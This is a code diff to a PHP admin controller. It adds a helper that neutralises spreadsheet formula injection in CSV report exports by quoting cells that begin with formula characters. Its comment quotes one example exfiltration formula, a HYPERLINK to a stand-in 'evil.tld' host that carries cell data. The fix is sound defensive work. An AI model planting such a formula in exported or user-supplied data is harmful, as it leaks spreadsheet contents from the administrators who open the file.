@@ -622,6 +622,31 @@ class ApplicationManagementController extends Controller
         return view('admin.reports.apel_c', compact('applications', 'total', 'approved', 'rejected', 'pending'));
     }
 
+    /**
+     * Neutralise spreadsheet formula injection in exported CSV cells.
+     *
+     * fputcsv escapes CSV delimiters but not formulas. Student name is
+     * user-supplied at registration and program_applied derives from student
+     * input, so a value beginning with = + - @ (or a leading tab/CR, which Excel
+     * strips before parsing) is evaluated when an administrator opens the
+     * downloaded report. That turns a student-controlled string into code
+     * execution in the admin's spreadsheet - for example
+     * =HYPERLINK("https://evil.tld/?d="&A1,"Click") exfiltrating the sheet.
+     *
+     * Prefixing with a single quote makes the cell a literal string in Excel,
+     * LibreOffice and Google Sheets.
+     */
+    private static function csvSafe($value): string
+    {
+        $value = (string) $value;
+
+        if ($value !== '' && str_contains("=+-@	", $value[0])) {
+            return "'" . $value;
+        }
+
+        return $value;
+    }
+
     public static function getCreditHoursFromCourseCode($code)
     {
         $code = trim($code);
@@ -668,11 +693,11 @@ class ApplicationManagementController extends Controller
             foreach ($applications as $app) {
                 $studentName = User::where('_id', $app->user_id)->value('name') ?? 'N/A';
                 fputcsv($file, [
-                    $app->submission_date,
-                    $studentName,
-                    $app->program_applied,
-                    ucfirst($app->admission_decision ?? 'pending'),
-                    $app->status
+                    self::csvSafe($app->submission_date),
+                    self::csvSafe($studentName),
+                    self::csvSafe($app->program_applied),
+                    self::csvSafe(ucfirst($app->admission_decision ?? 'pending')),
+                    self::csvSafe($app->status),
                 ]);
             }
 
@@ -700,13 +725,13 @@ class ApplicationManagementController extends Controller
             foreach ($applications as $app) {
                 $studentName = User::where('_id', $app->user_id)->value('name') ?? 'N/A';
                 fputcsv($file, [
-                    $app->submission_date,
-                    $studentName,
-                    $app->credit_course_name ?? 'N/A',
-                    $app->credit_course_code ?? 'N/A',
-                    $app->credit_hours_approved ?? 0,
-                    ucfirst($app->credit_decision ?? 'pending'),
-                    $app->status
+                    self::csvSafe($app->submission_date),
+                    self::csvSafe($studentName),
+                    self::csvSafe($app->credit_course_name ?? 'N/A'),
+                    self::csvSafe($app->credit_course_code ?? 'N/A'),
+                    self::csvSafe($app->credit_hours_approved ?? 0),
+                    self::csvSafe(ucfirst($app->credit_decision ?? 'pending')),
+                    self::csvSafe($app->status),
                 ]);
             }
 
